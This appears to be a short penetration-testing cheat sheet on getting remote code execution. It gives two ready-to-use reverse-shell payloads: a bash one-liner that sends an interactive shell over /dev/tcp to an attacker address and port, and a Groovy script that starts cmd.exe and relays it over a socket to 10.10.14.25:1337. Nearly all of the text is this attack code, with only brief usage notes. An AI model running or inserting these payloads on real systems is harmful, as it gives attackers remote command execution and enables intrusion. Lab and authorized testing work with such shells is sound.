
### General Notes

> Used to get remote code execution (RCE).

----
##### Bash Script to connect to our machine

> Set the [[IP]] address and [[Port]].
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
>`script.sh`

> Make sure the file is executable.
```shell
chmod +x script.sh
```

---
### Groovy script to connect to our machine

``` groovy
String host="10.10.14.25";
int port=1337;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---
